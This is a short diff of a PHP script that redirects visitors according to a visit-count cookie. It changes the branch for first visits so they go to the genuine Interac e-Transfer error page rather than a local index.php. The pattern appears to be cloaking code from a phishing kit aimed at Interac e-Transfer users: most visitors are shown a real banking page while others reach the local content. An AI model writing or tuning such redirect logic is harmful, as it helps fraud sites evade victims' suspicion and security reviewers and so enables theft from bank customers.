@@ -10,8 +10,8 @@ if (!isset($_COOKIE['visit_count'])) {
 }
 
 // Redirect based on visit count
-if ($visit_count < 1) {
-  header("Location: index.php");
+if ($visit_count < 2) {
+  header("Location: https://etransfer.interac.ca/error/");
 } elseif ($visit_count >= 2 && $visit_count < 6) {
   header("Location: index.php");
 } elseif ($visit_count >= 7 && $visit_count < 10) {
